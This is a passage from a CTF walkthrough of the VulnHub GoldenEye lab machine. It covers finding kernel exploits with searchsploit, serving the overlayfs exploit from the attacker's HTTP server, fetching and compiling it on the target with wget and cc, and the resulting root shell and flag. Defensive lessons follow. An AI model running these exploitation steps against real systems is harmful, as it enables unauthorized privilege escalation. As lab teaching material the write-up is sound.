> searchsploit linux kernel $(uname -r | cut -d- -f1)
> ```
>
> Cross-reference the version at <https://www.linuxkernelcves.com/> and
> <https://github.com/SecWiki/linux-kernel-exploits>. Frequent favourites:
>
> | Exploit | Kernel | Mechanism |
> | --- | --- | --- |
> | **Dirty COW** (CVE-2016-5195) | < 4.8.3 | Race in copy-on-write → write any file |
> | **Overlayfs** (CVE-2015-1328) | Ubuntu 3.13–3.19 | Namespace + setuid → root |
> | **PwnKit** (CVE-2021-4034) | polkit < 0.120 | `pkexec` memory corruption |
> | **Baron Samedit** (CVE-2021-3156) | sudo < 1.9.5p2 | `sudoedit` heap overflow |
> | **Dirty Pipe** (CVE-2022-0847) | 5.8 – 5.16.11 | Page-cache write → overwrite any file |
>
> **Match the architecture too.** A 32-bit target (`i686` in `uname -a`) needs the
> 32-bit build; a mismatched exploit fails with a confusing error. Compile with the
> flags the author specifies — Dirty COW's `40847.cpp` needs
> `g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil`.
>
> > ⚠️ **Use kernel exploits last.** They can panic the VM, corrupt the filesystem
> > and cost you a full re-import. If a clean misconfiguration path exists — `sudo`,
> > SUID, capabilities, cron, a writable file — take it. Kernel exploitation is the
> > fallback when the administrator got everything else right.
>
> **Read the exploit before running it.** Many public entries are unverified and some
> are hostile to whoever runs them. `searchsploit -x <id>` and understand it.
>
> **Deep dive:** [CONCEPTS §15.7 — Kernel exploits](../../docs/CONCEPTS.md#157-kernel-exploits)
> ### 📖 Concept — CVEs, Exploit-DB and searchsploit
>
> **The identifiers:**
> - **CVE** — a stable ID for one vulnerability. `CVE-2014-6271` is Shellshock.
>   Look it up at <https://nvd.nist.gov/vuln/search>.
> - **CVSS** — a 0.0–10.0 severity score. Useful for *prioritising*, **not** for
>   deciding exploitability: a CVSS 9.8 needing physical access is less useful to you
>   than a 5.3 reachable over HTTP.
> - **EDB ID** — a numbered public proof-of-concept on Exploit-DB.
>
> **`searchsploit`** is a **local, offline** search of the Exploit-DB archive shipped
> with Kali. Offline matters — it works mid-engagement with no internet.
>
> ```bash
> searchsploit wordpress 4.8            # search titles and paths
> searchsploit -t apache 2.4            # titles only — far fewer false positives
> searchsploit -m php/webapps/37596.py  # mirror (copy) it into your cwd
> searchsploit -x php/webapps/41006.txt # examine (print) it
> searchsploit -p 41006                 # show the full path
> searchsploit --update                 # refresh the local database
> ```
>
> > **Read the exploit before you run it.** Non-negotiable, for three reasons:
> > (1) many Exploit-DB entries are *unverified*, and some are outright malicious to
> > the person running them; (2) you need to know which parameters to change
> > (`RHOST`, `LHOST`, target path, memory offsets); (3) understanding it is the
> > entire point of the exercise.
>
> The workflow that actually works: get an exact **version** from `nmap -sV` or the
> app's own footer, search it, read the top candidate, then reproduce the request
> **by hand with `curl`** so you know what exploitation looked like. Only then decide
> whether the automated module is worth it.
>
> **Deep dive:** [CONCEPTS §11 — Finding and using exploits](../../docs/CONCEPTS.md#11-finding-and-using-exploits)

```bash
searchsploit 3.13 overlayfs
```

```text
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation | linux/local/37292.c
```

Copy the exploit to the target and compile it. **GoldenEye has no `gcc`** — it
has `cc` and `clang`, so edit the source to replace `gcc` with `cc`.

```bash
# On Kali: fix the compiler reference in the exploit
searchsploit -m linux/local/37292.c
sed -i 's/gcc/cc/g' 37292.c
ls -la 37292.c
```

```bash
# Serve it to the target, then download + compile + run from the www-data shell
# (run this on Kali)
python3 -m http.server 8000
```

```bash
# On the target (www-data shell)
cd /tmp
wget http://192.168.56.10:8000/37292.c
cc 37292.c -o ofs
./ofs
```

```text
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
```

> **Why it works:** overlayfs did not correctly check permissions when creating
> files in the "upper" directory of an overlay mount. The exploit mounts an
> overlay inside a user namespace and abuses this to write
> `/etc/ld.so.preload`, causing root-run programs to load an attacker-controlled
> shared library — i.e. code as `root`.

### The root flag

```bash
cat /root/.flag.txt
```

```text
Alec told me to place the codes here:
568628e0d993b1973adc718237da6e93

If you captured this make sure to go here.....
/006-final/xvf7-flag/
```

> The path hint also works from the web root: browse to
> `http://severnaya-station.com/006-final/xvf7-flag/`. The code itself
> (`568628e0...`) is the flag — *hash values vary by build*.

![root shell and the flag](images/08-root-flag.png)

---

## 5. Summary of vulnerabilities

| # | Vulnerability | Where | Impact |
| --- | --- | --- | --- |
| 1 | Credentials hidden as HTML entities | `/sev-home/js/terminal.js` | Basic-auth password disclosure (`boris`) |
| 2 | Username disclosure via `VRFY` | SMTP port 25 | Short list of valid mail users |
| 3 | Weak POP3 passwords + no lockout | Dovecot on port 55007 | Mailbox access (`boris`, `natalya`, `doak`) |
| 4 | Credentials left in email bodies | POP3 mail stores | Pivot to `xenia`, `dr_doak`, then `admin` |
| 5 | Admin-controllable command path | Moodle 2.2.3 "Path to aspell" | Remote code execution as `www-data` |
| 6 | Unpatched kernel | Ubuntu 14.04 / kernel 3.13.0-32 | Local privilege escalation to `root` (overlayfs) |

## 6. Defensive lessons (blue team)

- **Never store credentials in client-side files.** HTML-entity encoding is not
  encryption — it is a speed bump. Remove secrets from JS/HTML entirely.
- **Disable `VRFY`/`EXPN`** and use `disable_vrfy_command = yes` in Postfix so
  attackers cannot enumerate valid mailboxes.
- **Enforce strong passwords and rate limiting/lockouts** on POP3/IMAP. The
  passwords here (`secret1!`, `bird`, `goat`) are in every wordlist. Also keep
  mail on standard, TLS-only ports (993/995) so it is easy to monitor.
- **Never email plaintext credentials.** Email is retained indefinitely and is
  readable by anyone who gets into a mailbox.
- **Harden web apps:** run them behind a WAF, keep Moodle patched, and never
  expose "path to binary" settings that get passed to a shell. Treat any
  admin-editable "command" field as remote code execution waiting to happen.
- **Patch the kernel** and monitor for `/etc/ld.so.preload` creation and for
  unusual `mount`/`unshare` activity — both are strong overlayfs-exploit signals.
- **Logging/detection:** alert on thousands of failed POP3 `PASS` attempts
  (hydra), on `VG`/`VRFY` storms, and on high, non-standard mail ports.

---

## 7. References

- **Repository primer** — the fundamentals behind every command in this document: [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md)

- VulnHub entry: <https://vulnhub.com/entry/goldeneye-1,240/>
- Community writeups consulted:
  - [GoldenEye 1: CTF walkthrough, part 1 (Infosec Institute)](https://www.infosecinstitute.com/resources/capture-the-flag/goldeneye-1-ctf-walkthrough-part-1/)
  - [GoldenEye 1: CTF walkthrough, part 2 (Infosec Institute)](https://www.infosecinstitute.com/resources/capture-the-flag/golden-eye-1-ctf-walkthrough-part-2/)
  - [GoldenEye v1 writeup (NetChameleon)](https://netchameleon.com/VulnHub_Writeups/goldeneye_v1.html)
  - [Vulnhub Walkthrough – Goldeneye (n33dle-security)](https://n33dle-security.blogspot.com/2018/08/vulnhub-walkthrough-goldeneye.html)
  - [Vulnhub – GoldenEye writeup (mzfr)](https://blog.mzfr.me/vulnhub-writeups/2019-07-25-goldeneye)
- Vulnerability references:
  - [CVE-2015-1328 – overlayfs local privilege escalation](https://nvd.nist.gov/vuln/detail/CVE-2015-1328)
  - [Exploit-DB 37292.c](https://www.exploit-db.com/exploits/37292)
  - [Moodle RCE MSF module `exploit/multi/http/moodle_cmd_exec`](https://www.rapid7.com/db/modules/exploit/multi/http/moodle_cmd_exec)

---

## 8. Screenshot checklist

- [ ] `images/01-recon.png` — finding the target (`arp-scan` / `netdiscover`)
- [ ] `images/02-nmap.png` — port/service scan (25, 80, 55006, 55007)
- [ ] `images/03-enum.png` — `terminal.js` decoded to `boris:InvincibleHack3r`
- [ ] `images/04-foothold.png` — Moodle admin login / System paths page
- [ ] `images/05-shell.png` — reverse shell as `www-data`
- [ ] `images/06-user-flag.png` — enumeration / credential harvest (user-level access)
- [ ] `images/07-privesc.png` — compiling and running the overlayfs exploit
- [ ] `images/08-root-flag.png` — `root` shell and `/root/.flag.txt`

---

_Back to the [catalog](../../docs/CATALOG.md) · [README](../../README.md)._
